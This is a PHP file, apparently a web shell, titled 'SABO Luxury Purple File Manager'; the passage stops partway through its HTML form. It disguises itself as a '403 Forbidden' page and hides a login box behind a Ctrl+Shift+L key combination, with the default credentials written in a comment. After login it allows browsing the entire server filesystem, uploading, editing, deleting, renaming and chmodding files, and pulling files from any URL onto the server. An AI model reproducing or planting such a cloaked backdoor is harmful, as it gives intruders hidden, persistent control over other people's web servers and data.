<?php
session_start();

/*
|--------------------------------------------------------------------------
| SABO Luxury Purple File Manager
|--------------------------------------------------------------------------
| Username : sabo
| Password : password
|--------------------------------------------------------------------------
*/

// Aktifkan error reporting untuk debugging.
// NONAKTIFKAN display_errors di production.
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

/*
|--------------------------------------------------------------------------
| LOGIN CREDENTIALS
|--------------------------------------------------------------------------
*/
const USERNAME = 'sabo';
const HASHED_PASSWORD = '$2y$10$50i3Tbzs3XkhoXd0UB5pEuCtdPvKxUjUGPg6j5h6YAQfm4QMANc3W';

/*
|--------------------------------------------------------------------------
| DELETE FOLDER RECURSIVE
|--------------------------------------------------------------------------
*/
function deleteFolderRecursive($folder)
{
    if (!is_dir($folder)) {
        return false;
    }

    foreach (scandir($folder) as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }

        $path = $folder . DIRECTORY_SEPARATOR . $item;

        if (is_dir($path)) {
            deleteFolderRecursive($path);
        } else {
            @unlink($path);
        }
    }

    return @rmdir($folder);
}

/*
|--------------------------------------------------------------------------
| LOGOUT
|--------------------------------------------------------------------------
*/
if (isset($_GET['logout'])) {
    session_destroy();

    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

/*
|--------------------------------------------------------------------------
| LOGIN
|--------------------------------------------------------------------------
*/
if (!isset($_SESSION['logged_in'])) {

    if (isset($_POST['username']) && isset($_POST['password'])) {

        if (
            $_POST['username'] === USERNAME &&
            password_verify($_POST['password'], HASHED_PASSWORD)
        ) {
            $_SESSION['logged_in'] = true;

            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah!";
        }
    }
    ?>

<!DOCTYPE html>
<html lang="id">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>SABO Console - 403 Forbidden</title>

    <style>

        * {
            box-sizing: border-box;
        }

        html,
        body {
            margin: 0;
            padding: 0;
            width: 100%;
            min-height: 100%;
        }

        body {
            background:
                radial-gradient(
                    circle at 15% 20%,
                    rgba(139, 92, 246, .20),
                    transparent 30%
                ),
                radial-gradient(
                    circle at 85% 80%,
                    rgba(168, 85, 247, .16),
                    transparent 30%
                ),
                linear-gradient(
                    135deg,
                    #050008 0%,
                    #0d0018 45%,
                    #17002d 100%
                );

            color: #c084fc;
            font-family: "Courier New", monospace;
            overflow: hidden;
        }

        .forbidden-page {
            padding: 50px;
            color: #d8b4fe;
        }

        .forbidden-page h1 {
            color: #c084fc;
            text-shadow: 0 0 15px rgba(192, 132, 252, .65);
        }

        .forbidden-page p {
            color: #a78bfa;
        }

        .forbidden-page hr {
            border: 0;
            border-top: 1px solid rgba(168, 85, 247, .25);
        }

        #loginBox {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);

            width: min(390px, calc(100% - 40px));

            padding: 30px;

            background:
                linear-gradient(
                    145deg,
                    rgba(26, 4, 45, .97),
                    rgba(8, 2, 15, .98)
                );

            border: 1px solid #8b5cf6;
            border-radius: 16px;

            color: #d8b4fe;

            display: none;

            box-shadow:
                0 0 15px rgba(139, 92, 246, .25),
                0 0 60px rgba(126, 34, 206, .12),
                inset 0 0 30px rgba(139, 92, 246, .04);

            font-family: "Courier New", monospace;
        }

        #loginBox::before {
            content: "";
            display: block;
            height: 3px;
            margin: -30px -30px 25px -30px;

            background:
                linear-gradient(
                    90deg,
                    transparent,
                    #7c3aed,
                    #c084fc,
                    #7c3aed,
                    transparent
                );
        }

        #loginBox strong {
            color: #e9d5ff;
            font-size: 18px;
            text-shadow: 0 0 10px rgba(192, 132, 252, .7);
        }

        #loginBox span {
            color: #a78bfa;
        }

        #loginBox label {
            display: block;
            margin-bottom: 5px;
            color: #c084fc;
        }

        #loginBox input[type="text"],
        #loginBox input[type="password"] {
            width: 100%;

            background: rgba(5, 0, 10, .85);

            border: 0;
            border-bottom: 1px solid #7c3aed;

            color: #f3e8ff;

            padding: 10px 5px;
            margin-bottom: 20px;

            font-family: inherit;
            outline: none;

            transition: .25s ease;
        }

        #loginBox input[type="text"]:focus,
        #loginBox input[type="password"]:focus {
            border-bottom: 2px solid #c084fc;

            box-shadow:
                0 8px 20px rgba(139, 92, 246, .10);
        }

        #loginBox button[type="submit"] {
            width: 100%;

            background:
                linear-gradient(
                    135deg,
                    #6d28d9,
                    #9333ea,
                    #7c3aed
                );

            border: 1px solid #a855f7;

            color: #fff;

            padding: 11px;

            border-radius: 8px;

            font-family: inherit;
            font-weight: bold;

            cursor: pointer;

            transition: .25s ease;

            box-shadow:
                0 0 15px rgba(139, 92, 246, .25);
        }

        #loginBox button[type="submit"]:hover {
            transform: translateY(-1px);

            box-shadow:
                0 0 25px rgba(168, 85, 247, .45);

            background:
                linear-gradient(
                    135deg,
                    #7c3aed,
                    #a855f7
                );
        }

        .error-message {
            color: #fda4af;

            margin-bottom: 15px;

            font-weight: bold;

            background: rgba(127, 29, 29, .18);

            border: 1px solid rgba(244, 63, 94, .35);

            border-radius: 7px;

            padding: 10px;
        }

        .console-line {
            margin-bottom: 25px;
            line-height: 1.7;
        }

        .cursor {
            display: inline-block;
            width: 8px;
            height: 15px;
            background: #c084fc;
            animation: blink 1s infinite;
            vertical-align: middle;
        }

        @keyframes blink {
            0%, 45% {
                opacity: 1;
            }

            46%, 100% {
                opacity: 0;
            }
        }

    </style>

</head>

<body>

    <div class="forbidden-page">

        <h1>Forbidden</h1>

        <p>
            You don't have permission to access
            <?= htmlspecialchars($_SERVER['PHP_SELF']) ?>
            on this server.
        </p>

        <hr>

    </div>

    <div id="loginBox">

        <div class="console-line">

            <strong>SABO Console</strong><br>

            <span>
                system@SABO:~$ authentication_required
            </span>

            <br>

            <span>
                login:
            </span>

            <span class="cursor"></span>

        </div>

        <?php if (isset($error)): ?>

            <div class="error-message">
                <?= htmlspecialchars($error) ?>
            </div>

        <?php endif; ?>

        <form method="post">

            <label>
                Username
            </label>

            <input
                type="text"
                name="username"
                autocomplete="username"
                required
            >

            <label>
                Password
            </label>

            <input
                type="password"
                name="password"
                autocomplete="current-password"
                required
            >

            <button type="submit">
                ACCESS CONSOLE
            </button>

        </form>

    </div>

    <script>

        document.addEventListener('keydown', function(e) {

            if (
                e.ctrlKey &&
                e.shiftKey &&
                e.key.toUpperCase() === 'L'
            ) {

                const box = document.getElementById('loginBox');

                box.style.display =
                    box.style.display === 'none'
                        ? 'block'
                        : 'none';
            }

        });

    </script>

</body>
</html>

<?php
    exit;
}

/*
|--------------------------------------------------------------------------
| FILE PERMISSIONS
|--------------------------------------------------------------------------
*/
function get_permissions($file)
{
    if (!file_exists($file)) {
        return 'N/A';
    }

    return substr(sprintf('%o', fileperms($file)), -4);
}

/*
|--------------------------------------------------------------------------
| BREADCRUMB
|--------------------------------------------------------------------------
*/
function render_path_links($path)
{
    $path = realpath($path) ?: __DIR__;

    $parts = explode(
        DIRECTORY_SEPARATOR,
        trim($path, DIRECTORY_SEPARATOR)
    );

    $out =
        '<a href="?path=' .
        urlencode(DIRECTORY_SEPARATOR) .
        '" class="breadcrumb-link">/</a>';

    if (
        $path === DIRECTORY_SEPARATOR ||
        (
            strlen($path) === 3 &&
            $path[1] === ':' &&
            $path[2] === DIRECTORY_SEPARATOR
        )
    ) {

        return
            '<a href="?path=' .
            urlencode($path) .
            '" class="breadcrumb-link">' .
            htmlspecialchars($path) .
            '</a>';
    }

    $acc = '';

    foreach ($parts as $p) {

        if ($p === '') {
            continue;
        }

        $acc .= DIRECTORY_SEPARATOR . $p;

        $out .=
            ' <span class="breadcrumb-separator">/</span> ' .
            '<a href="?path=' .
            urlencode($acc) .
            '" class="breadcrumb-link">' .
            htmlspecialchars($p) .
            '</a>';
    }

    return $out;
}

/*
|--------------------------------------------------------------------------
| CURRENT DIRECTORY
|--------------------------------------------------------------------------
*/
$dir = $_GET['path'] ?? __DIR__;

$dir = realpath($dir) ?: __DIR__;

/*
|--------------------------------------------------------------------------
| CREATE FOLDER
|--------------------------------------------------------------------------
*/
if (
    isset($_POST['create_folder']) &&
    !empty($_POST['folder_name'])
) {

    $newFolder =
        $dir .
        DIRECTORY_SEPARATOR .
        basename($_POST['folder_name']);

    if (!file_exists($newFolder)) {

        if (@mkdir($newFolder, 0755)) {

            header(
                "Location: " .
                $_SERVER['PHP_SELF'] .
                "?path=" .
                urlencode($dir)
            );

            exit;

        } else {

            $error =
                "Gagal membuat folder. Periksa izin direktori.";
        }

    } else {

        $error = "Folder sudah ada!";
    }
}

/*
|--------------------------------------------------------------------------
| CREATE FILE
|--------------------------------------------------------------------------
*/
if (
    isset($_POST['create_file']) &&
    !empty($_POST['file_name'])
) {

    $newFile =
        $dir .
        DIRECTORY_SEPARATOR .
        basename($_POST['file_name']);

    if (!file_exists($newFile)) {

        if (@file_put_contents($newFile, "") !== false) {

            header(
                "Location: " .
                $_SERVER['PHP_SELF'] .
                "?path=" .
                urlencode($dir)
            );

            exit;

        } else {

            $error =
                "Gagal membuat file. Periksa izin direktori.";
        }

    } else {

        $error = "File sudah ada!";
    }
}

/*
|--------------------------------------------------------------------------
| UPLOAD FILE
|--------------------------------------------------------------------------
*/
if (
    isset($_FILES['file']) &&
    $_SERVER['REQUEST_METHOD'] === 'POST'
) {

    if (
        isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&
        strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) ===
        'xmlhttprequest'
    ) {

        $uploaded = 0;
        $errors = [];

        $files = $_FILES['file'];

        if (!is_array($files['name'])) {

            $files = [
                'name' => [$files['name']],
                'tmp_name' => [$files['tmp_name']],
                'error' => [$files['error']],
                'size' => [$files['size']],
                'type' => [$files['type']]
            ];
        }

        for (
            $i = 0;
            $i < count($files['name']);
            $i++
        ) {

            if (
                $files['error'][$i] ===
                UPLOAD_ERR_OK
            ) {

                $targetFile =
                    $dir .
                    DIRECTORY_SEPARATOR .
                    basename($files['name'][$i]);

                if (
                    @move_uploaded_file(
                        $files['tmp_name'][$i],
                        $targetFile
                    )
                ) {

                    $uploaded++;

                } else {

                    $errors[] =
                        "Gagal upload file: " .
                        htmlspecialchars(
                            $files['name'][$i]
                        );
                }

            } else {

                $errors[] =
                    "Upload error untuk " .
                    htmlspecialchars(
                        $files['name'][$i]
                    ) .
                    ": " .
                    $files['error'][$i];
            }
        }

        header(
            'Content-Type: application/json'
        );

        if (empty($errors)) {

            http_response_code(200);

            echo json_encode([
                'status' => 'success',
                'message' =>
                    "$uploaded file berhasil diupload."
            ]);

        } else {

            http_response_code(500);

            echo json_encode([
                'status' => 'error',
                'message' =>
                    implode("\n", $errors)
            ]);
        }

        exit;
    }

    header(
        "Location: " .
        $_SERVER['PHP_SELF'] .
        "?path=" .
        urlencode($dir)
    );

    exit;
}

/*
|--------------------------------------------------------------------------
| DELETE
|--------------------------------------------------------------------------
*/
if (isset($_GET['delete'])) {

    $targetName =
        basename($_GET['delete']);

    $targetPath =
        $dir .
        DIRECTORY_SEPARATOR .
        $targetName;

    if (file_exists($targetPath)) {

        if (is_file($targetPath)) {

            @unlink($targetPath);

        } elseif (is_dir($targetPath)) {

            deleteFolderRecursive($targetPath);
        }
    }

    header(
        "Location: " .
        $_SERVER['PHP_SELF'] .
        "?path=" .
        urlencode($dir)
    );

    exit;
}

/*
|--------------------------------------------------------------------------
| RENAME
|--------------------------------------------------------------------------
*/
if (
    isset($_POST['rename']) &&
    isset($_POST['old_name']) &&
    isset($_POST['new_name'])
) {

    $oldName =
        basename($_POST['old_name']);

    $newName =
        basename($_POST['new_name']);

    $oldPath =
        $dir .
        DIRECTORY_SEPARATOR .
        $oldName;

    $newPath =
        $dir .
        DIRECTORY_SEPARATOR .
        $newName;

    if (
        file_exists($oldPath) &&
        !file_exists($newPath)
    ) {

        @rename(
            $oldPath,
            $newPath
        );
    }

    header(
        "Location: " .
        $_SERVER['PHP_SELF'] .
        "?path=" .
        urlencode($dir)
    );

    exit;
}

/*
|--------------------------------------------------------------------------
| CHMOD
|--------------------------------------------------------------------------
*/
if (
    isset($_POST['chmod']) &&
    isset($_POST['file_name']) &&
    isset($_POST['perm'])
) {

    $fileName =
        basename($_POST['file_name']);

    $filePath =
        $dir .
        DIRECTORY_SEPARATOR .
        $fileName;

    $perm = $_POST['perm'];

    if (
        preg_match(
            '/^[0-7]{3,4}$/',
            $perm
        ) &&
        file_exists($filePath)
    ) {

        @chmod(
            $filePath,
            octdec($perm)
        );
    }

    header(
        "Location: " .
        $_SERVER['PHP_SELF'] .
        "?path=" .
        urlencode($dir)
    );

    exit;
}

/*
|--------------------------------------------------------------------------
| AJAX LOAD FILE
|--------------------------------------------------------------------------
*/
if (
    isset($_GET['ajax_load_file']) &&
    isset($_GET['file']) &&
    isset($_GET['current_path'])
) {

    $currentPathFromJs =
        realpath(
            urldecode($_GET['current_path'])
        );

    if ($currentPathFromJs === false) {

        http_response_code(400);

        echo
            "Error: Path current_path tidak valid.";

        exit;
    }

    $fileName =
        basename($_GET['file']);

    $filePath =
        $currentPathFromJs .
        DIRECTORY_SEPARATOR .
        $fileName;

    if (
        file_exists($filePath) &&
        is_file($filePath)
    ) {

        header(
            'Content-Type: text/plain; charset=utf-8'
        );

        try {

            $content =
                file_get_contents($filePath);

            if ($content === false) {

                throw new Exception(
                    "Gagal membaca konten file. Periksa izin baca."
                );
            }

            echo $content;

        } catch (Exception $e) {

            http_response_code(500);

            echo
                "Error saat memuat file: " .
                $e->getMessage();

            error_log(
                "SABO_FM_ERROR: Failed to read file " .
                $filePath .
                ". Error: " .
                $e->getMessage()
            );
        }

    } else {

        http_response_code(404);

        echo
            "Error: File tidak ditemukan, atau bukan file.";

        error_log(
            "SABO_FM_ERROR: Attempt to load invalid file: " .
            $filePath
        );
    }

    exit;
}

/*
|--------------------------------------------------------------------------
| AJAX SAVE FILE
|--------------------------------------------------------------------------
*/
if (
    isset($_POST['ajax_save_file']) &&
    isset($_POST['edit_file']) &&
    isset($_POST['content']) &&
    isset($_POST['current_path'])
) {

    $currentPathFromJs =
        realpath(
            urldecode($_POST['current_path'])
        );

    if ($currentPathFromJs === false) {

        http_response_code(400);

        echo
            "Error: Path current_path tidak valid untuk penyimpanan.";

        exit;
    }

    $fileName =
        basename($_POST['edit_file']);

    $filePath =
        $currentPathFromJs .
        DIRECTORY_SEPARATOR .
        $fileName;

    if (
        file_exists($filePath) &&
        is_file($filePath)
    ) {

        try {

            if (
                file_put_contents(
                    $filePath,
                    $_POST['content']
                ) !== false
            ) {

                echo "OK";

            } else {

                throw new Exception(
                    "Operasi tulis file gagal. Periksa izin tulis."
                );
            }

        } catch (Exception $e) {

            http_response_code(500);

            echo
                "Error saat menyimpan file: " .
                $e->getMessage();

            error_log(
                "SABO_FM_ERROR: Failed to write file " .
                $filePath .
                ". Error: " .
                $e->getMessage()
            );
        }

    } else {

        http_response_code(400);

        echo
            "Error: File tidak ditemukan, atau bukan file.";

        error_log(
            "SABO_FM_ERROR: Attempt to save invalid file: " .
            $filePath
        );
    }

    exit;
}

/*
|--------------------------------------------------------------------------
| DOWNLOAD FILE FROM URL
|--------------------------------------------------------------------------
*/
if (
    isset($_POST['download_file']) &&
    !empty($_POST['download_url']) &&
    !empty($_POST['download_name'])
) {

    $url =
        filter_var(
            $_POST['download_url'],
            FILTER_VALIDATE_URL
        );

    $saveName =
        basename($_POST['download_name']);

    if ($url && $saveName) {

        $targetFile =
            $dir .
            DIRECTORY_SEPARATOR .
            $saveName;

        try {

            $fileContent =
                @file_get_contents($url);

            if ($fileContent === false) {

                throw new Exception(
                    "Gagal mengunduh konten dari URL."
                );
            }

            if (
                file_put_contents(
                    $targetFile,
                    $fileContent
                ) === false
            ) {

                throw new Exception(
                    "Gagal menyimpan file yang didownload."
                );
            }

        } catch (Exception $e) {

            $error =
                "Download Error: " .
                $e->getMessage();

            error_log(
                "SABO_FM_ERROR: Download failed for URL " .
                $url .
                ". Error: " .
                $e->getMessage()
            );
        }

    } else {

        $error =
            "URL download atau nama file tidak valid.";
    }

    header(
        "Location: " .
        $_SERVER['PHP_SELF'] .
        "?path=" .
        urlencode($dir)
    );

    exit;
}

/*
|--------------------------------------------------------------------------
| READ DIRECTORY
|--------------------------------------------------------------------------
*/
$items = scandir($dir);

?>

<!DOCTYPE html>
<html lang="id">

<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>SABO Luxury File Manager</title>

    <link
        href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
        rel="stylesheet"
    >

    <style>

        /*
        |--------------------------------------------------------------------------
        | LUXURY PURPLE THEME
        |--------------------------------------------------------------------------
        */

        :root {
            --purple-900: #16002b;
            --purple-800: #240046;
            --purple-700: #3c096c;
            --purple-600: #5a189a;
            --purple-500: #7b2cbf;
            --purple-400: #9d4edd;
            --purple-300: #c77dff;
            --purple-200: #e0aaff;

            --dark: #07000d;
            --dark-2: #0d0018;

            --text: #eadcff;
            --muted: #b794d6;

            --danger: #fb7185;
            --warning: #fbbf24;
            --success: #86efac;
        }

        * {
            box-sizing: border-box;
        }

        html {
            min-height: 100%;
        }

        body {

            min-height: 100vh;

            background:
                radial-gradient(
                    circle at 10% 10%,
                    rgba(157, 78, 221, .18),
                    transparent 30%
                ),
                radial-gradient(
                    circle at 90% 90%,
                    rgba(123, 44, 191, .18),
                    transparent 35%
                ),
                radial-gradient(
                    circle at 50% 0%,
                    rgba(199, 125, 255, .07),
                    transparent 35%
                ),
                linear-gradient(
                    135deg,
                    #050008 0%,
                    #10001c 40%,
                    #19002d 70%,
                    #07000d 100%
                );

            color: var(--text);

            font-family:
                "Courier New",
                Courier,
                monospace;
        }

        body::before {

            content: "";

            position: fixed;

            inset: 0;

            pointer-events: none;

            background:
                linear-gradient(
                    rgba(255,255,255,.015) 1px,
                    transparent 1px
                );

            background-size: 100% 4px;

            opacity: .15;

            z-index: -1;
        }

        /*
        |--------------------------------------------------------------------------
        | NAVBAR
        |--------------------------------------------------------------------------
        */

        .navbar {

            background:
                linear-gradient(
                    90deg,
                    rgba(10, 0, 18, .97),
                    rgba(30, 0, 50, .94),
                    rgba(10, 0, 18, .97)
                );

            border-bottom:
                1px solid
                rgba(192, 132, 252, .25);

            box-shadow:
                0 5px 30px
                rgba(126, 34, 206, .20);

            backdrop-filter: blur(12px);
        }

        .navbar-brand {

            color: var(--purple-300) !important;

            font-size: 1.45rem;

            font-weight: 800;

            letter-spacing: 1px;

            text-shadow:
                0 0 5px rgba(192, 132, 252, .65),
                0 0 15px rgba(139, 92, 246, .35);
        }

        .navbar-brand::before {
            content: "◆ ";
            color: var(--purple-400);
        }

        /*
        |--------------------------------------------------------------------------
        | CONTAINER
        |--------------------------------------------------------------------------
        */

        .container {
            margin-top: 35px;
            padding-bottom: 50px;
        }

        /*
        |--------------------------------------------------------------------------
        | PATH
        |--------------------------------------------------------------------------
        */

        .path-box {

            background:
                rgba(20, 0, 35, .65);

            border:
                1px solid
                rgba(168, 85, 247, .20);

            border-radius: 10px;

            padding: 12px 16px;

            box-shadow:
                inset 0 0 20px
                rgba(126, 34, 206, .05);
        }

        .breadcrumb-link {

            color: var(--purple-300);

            text-decoration: none;

            transition: .2s;
        }

        .breadcrumb-link:hover {

            color: #fff;

            text-shadow:
                0 0 10px
                rgba(192, 132, 252, .7);
        }

        .breadcrumb-separator {
            color: #6d28d9;
        }

        /*
        |--------------------------------------------------------------------------
        | TABLE
        |--------------------------------------------------------------------------
        */

        .table {

            overflow: hidden;

            background:
                rgba(5, 0, 10, .80);

            border:
                1px solid
                rgba(139, 92, 246, .35);

            border-radius: 12px;

            box-shadow:
                0 0 25px
                rgba(126, 34, 206, .12);
        }

        .table th,
        .table td {

            vertical-align: middle;

            color: var(--text);

            border-color:
                rgba(139, 92, 246, .18);
        }

        .table thead th {

            background:
                linear-gradient(
                    90deg,
                    rgba(38, 0, 67, .98),
                    rgba(20, 0, 35, .98)
                );

            color: var(--purple-200);

            border-color:
                rgba(168, 85, 247, .35);

            text-transform: uppercase;

            font-size: .85rem;

            letter-spacing: .5px;
        }

        .table-hover tbody tr {

            transition: .2s ease;
        }

        .table-hover tbody tr:hover {

            background:
                rgba(139, 92, 246, .08);

            box-shadow:
                inset 3px 0 0
                rgba(192, 132, 252, .7);
        }

        /*
        |--------------------------------------------------------------------------
        | LINKS
        |--------------------------------------------------------------------------
        */

        a {
            color: var(--purple-300);
            text-decoration: none;
        }

        a:hover {

            color: #fff;

            text-decoration: none;

            text-shadow:
                0 0 8px
                rgba(192, 132, 252, .65);
        }

        /*
        |--------------------------------------------------------------------------
        | BUTTONS
        |--------------------------------------------------------------------------
        */

        .btn {

            border-radius: 8px;

            font-weight: 700;

            letter-spacing: .2px;

            transition:
                transform .2s ease,
                box-shadow .2s ease,
                background .2s ease;

            border-width: 1px;
        }

        .btn:hover {

            transform: translateY(-1px);
        }

        .btn-primary {

            background:
                linear-gradient(
                    135deg,
                    #6d28d9,
                    #9333ea
                );

            border-color: #a855f7;

            color: #fff;

            box-shadow:
                0 0 10px
                rgba(139, 92, 246, .15);
        }

        .btn-primary:hover {

            background:
                linear-gradient(
                    135deg,
                    #7c3aed,
                    #a855f7
                );

            border-color: #c084fc;

            color: #fff;

            box-shadow:
                0 0 18px
                rgba(168, 85, 247, .35);
        }

        .btn-success {

            background:
                linear-gradient(
                    135deg,
                    #166534,
                    #15803d
                );

            border-color: #4ade80;

            color: #dcfce7;
        }

        .btn-success:hover {

            background:
                linear-gradient(
                    135deg,
                    #15803d,
                    #22c55e
                );

            color: #fff;
        }

        .btn-info {

            background:
                linear-gradient(
                    135deg,
                    #581c87,
                    #7e22ce
                );

            border-color: #c084fc;

            color: #f3e8ff;
        }

        .btn-info:hover {

            background:
                linear-gradient(
                    135deg,
                    #7e22ce,
                    #9333ea
                );

            color: #fff;
        }

        .btn-warning {

            background:
                linear-gradient(
                    135deg,
                    #92400e,
                    #b45309
                );

            border-color: #fbbf24;

            color: #fef3c7;
        }

        .btn-warning:hover {

            background:
                linear-gradient(
                    135deg,
                    #b45309,
                    #d97706
                );

            color: #fff;
        }

        .btn-danger {

            background:
                linear-gradient(
                    135deg,
                    #881337,
                    #be123c
                );

            border-color: #fb7185;

            color: #ffe4e6;
        }

        .btn-danger:hover {

            background:
                linear-gradient(
                    135deg,
                    #be123c,
                    #e11d48
                );

            color: #fff;
        }

        .btn-secondary {

            background:
                linear-gradient(
                    135deg,
                    #312e81,
                    #4c1d95
                );

            border-color: #8b5cf6;

            color: #ede9fe;
        }

        .btn-secondary:hover {

            background:
                linear-gradient(
                    135deg,
                    #4c1d95,
                    #6d28d9
                );

            color: #fff;
        }

        .btn-outline-danger {

            color: #fb7185;

            border-color: #fb7185;

            background:
                rgba(127, 29, 29, .08);
        }

        .btn-outline-danger:hover {

            background: #be123c;

            color: #fff;

            box-shadow:
                0 0 12px
                rgba(244, 63, 94, .25);
        }

        .btn-outline-warning {

            color: #fbbf24;

            border-color: #fbbf24;

            background:
                rgba(120, 53, 15, .08);
        }

        .btn-outline-warning:hover {

            background: #b45309;

            color: #fff;

            box-shadow:
                0 0 12px
                rgba(251, 191, 36, .20);
        }

        /*
        |--------------------------------------------------------------------------
        | INPUT
        |--------------------------------------------------------------------------
        */

        input[type="text"].perm-input,
        .form-control {

            background:
                rgba(10, 0, 18, .90);

            border:
                1px solid
                rgba(139, 92, 246, .55);

            color:
                #f3e8ff;

            border-radius: 7px;

            padding:
                .5rem .75rem;

            transition:
                border-color .2s,
                box-shadow .2s;
        }

        .form-control::placeholder {

            color:
                rgba(216, 180, 254, .45);
        }

        .form-control:focus {

            background:
                rgba(12, 0, 22, .95);

            color: #fff;

            border-color:
                var(--purple-300);

            box-shadow:
                0 0 0 .2rem
                rgba(168, 85, 247, .18);
        }

        input[type="file"]::file-selector-button {

            background:
                linear-gradient(
                    135deg,
                    #581c87,
                    #7e22ce
                );

            color: #fff;

            border: 0;

            padding: 8px 14px;

            margin-right: 10px;

            border-radius: 6px;
        }

        /*
        |--------------------------------------------------------------------------
        | PERMISSION INPUT
        |--------------------------------------------------------------------------
        */

        .perm-input {

            width: 75px !important;

            text-align: center;

            color: #e9d5ff !important;
        }

        /*
        |--------------------------------------------------------------------------
        | PROGRESS
        |--------------------------------------------------------------------------
        */

        .progress {

            background:
                #140020;

            border:
                1px solid
                rgba(139, 92, 246, .25);

            border-radius: 8px;

            overflow: hidden;
        }

        .progress-bar {

            background:
                linear-gradient(
                    90deg,
                    #6d28d9,
                    #9333ea,
                    #c084fc
                );

            box-shadow:
                0 0 15px
                rgba(168, 85, 247, .35);
        }

        #uploadStatus {

            color:
                var(--purple-300);
        }

        /*
        |--------------------------------------------------------------------------
        | MODAL
        |--------------------------------------------------------------------------
        */

        .modal-content {

            background:
                linear-gradient(
                    145deg,
                    #180027,
                    #08000e
                ) !important;

            border:
                1px solid
                rgba(168, 85, 247, .45) !important;

            border-radius: 14px !important;

            box-shadow:
                0 0 50px
                rgba(126, 34, 206, .22);
        }

        .modal-header {

            border-bottom:
                1px solid
                rgba(168, 85, 247, .18);
        }

        .modal-footer {

            border-top:
                1px solid
                rgba(168, 85, 247, .18);
        }

        .modal-title {

            color:
                var(--purple-200);

            text-shadow:
                0 0 10px
                rgba(192, 132, 252, .25);
        }

        .btn-close-white {
            filter:
                drop-shadow(
                    0 0 5px
                    rgba(192, 132, 252, .35)
                );
        }

        /*
        |--------------------------------------------------------------------------
        | EDITOR
        |--------------------------------------------------------------------------
        */

        textarea#editFileContent {

            background:
                #09000f;

            color:
                #d8b4fe;

            border:
                1px solid
                #7c3aed;

            resize:
                vertical;

            font-family:
                "Consolas",
                "Monaco",
                "Courier New",
                monospace;

            line-height:
                1.5;

            padding:
                14px;

            border-radius:
                8px;

            box-shadow:
                inset 0 0 25px
                rgba(126, 34, 206, .06);
        }

        textarea#editFileContent:focus {

            border-color:
                #c084fc;

            box-shadow:
                0 0 0 .2rem
                rgba(168, 85, 247, .15);
        }

        #editFileStatus {

            color:
                var(--purple-300);

            font-style:
                italic;
        }

        /*
        |--------------------------------------------------------------------------
        | ALERT
        |--------------------------------------------------------------------------
        */

        .alert {

            font-weight:
                bold;

            padding:
                10px 15px;

            border-radius:
                8px;

            animation:
                fadeIn .5s;

            border:
                1px solid;
        }

        .alert-danger {

            background:
                rgba(127, 29, 29, .25);

            border-color:
                rgba(244, 63, 94, .45);

            color:
                #fecdd3;
        }

        .alert-success {

            background:
                rgba(20, 83, 45, .25);

            border-color:
                rgba(74, 222, 128, .40);

            color:
                #bbf7d0;
        }

        .alert-warning {

            background:
                rgba(120, 53, 15, .25);

            border-color:
                rgba(251, 191, 36, .40);

            color:
                #fde68a;
        }

        /*
        |--------------------------------------------------------------------------
        | ACTIONS
        |--------------------------------------------------------------------------
        */

        .actions-container {

            display:
                flex;

            gap:
                5px;

            align-items:
                center;
        }

        .file-actions {
            white-space: nowrap;
        }

        /*
        |--------------------------------------------------------------------------
        | SCROLLBAR
        |--------------------------------------------------------------------------
        */

        ::-webkit-scrollbar {
            width: 9px;
            height: 9px;
        }

        ::-webkit-scrollbar-track {
            background:
                #08000d;
        }

        ::-webkit-scrollbar-thumb {

            background:
                linear-gradient(
                    180deg,
                    #6d28d9,
                    #9333ea
                );

            border-radius:
                10px;
        }

        ::-webkit-scrollbar-thumb:hover {

            background:
                linear-gradient(
                    180deg,
                    #9333ea,
                    #c084fc
                );
        }

        /*
        |--------------------------------------------------------------------------
        | FADE
        |--------------------------------------------------------------------------
        */

        @keyframes fadeIn {

            from {
                opacity: 0;
                transform: translateY(-4px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }

        }

        /*
        |--------------------------------------------------------------------------
        | MOBILE
        |--------------------------------------------------------------------------
        */

        @media (max-width: 768px) {

            .navbar {
                padding: 12px !important;
            }

            .navbar-brand {
                font-size: 1.05rem;
            }

            .container {
                margin-top: 20px;
                padding-left: 10px;
                padding-right: 10px;
            }

            .table {
                font-size: 12px;
            }

            .table th,
            .table td {
                padding: 8px 5px;
            }

            .actions-container {
                flex-wrap: wrap;
            }

            .perm-input {
                width: 60px !important;
            }

        }

    </style>

</head>

<body>

<nav
    class="navbar navbar-dark px-4 py-3 d-flex justify-content-between align-items-center"
>

    <span class="navbar-brand mb-0 h1">
        SABO Filemanager
    </span>

    <div>

        <button
            class="btn btn-success btn-sm me-2"
            data-bs-toggle="modal"
            data-bs-target="#createFolderModal"
            title="Buat Folder Baru"
        >
            📁 Folder Baru
        </button>

        <button
            class="btn btn-info btn-sm me-3"
            data-bs-toggle="modal"
            data-bs-target="#createFileModal"
            title="Buat File Baru"
        >
            📄 File Baru
        </button>

        <a
            href="?logout=1"
            class="btn btn-sm btn-danger"
        >
            Logout
        </a>

    </div>

</nav>

<div class="container">

    <div class="path-box mb-4">

        <strong style="color:#c084fc;">
            📁 PATH:
        </strong>

        <?= render_path_links($dir) ?>

    </div>

    <!-- UPLOAD -->

    <form
        id="uploadForm"
        enctype="multipart/form-data"
        class="my-3 d-flex gap-2"
        method="post"
    >

        <input
            type="file"
            id="fileInput"
            name="file[]"
            multiple
            class="form-control"
        >

        <button
            type="submit"
            class="btn btn-primary"
        >
            ⬆ Upload
        </button>

    </form>

    <div
        class="progress"
        style="height:20px;display:none;"
        id="progressWrapper"
    >

        <div
            id="progressBar"
            class="progress-bar progress-bar-striped progress-bar-animated"
            role="progressbar"
            style="width:0%"
        >
            0%
        </div>

    </div>

    <div
        id="uploadStatus"
        class="mt-2 mb-3"
    ></div>

    <!-- DOWNLOAD -->

    <form
        method="post"
        class="mb-4 d-flex gap-2 align-items-center"
    >

        <input
            type="url"
            name="download_url"
            class="form-control"
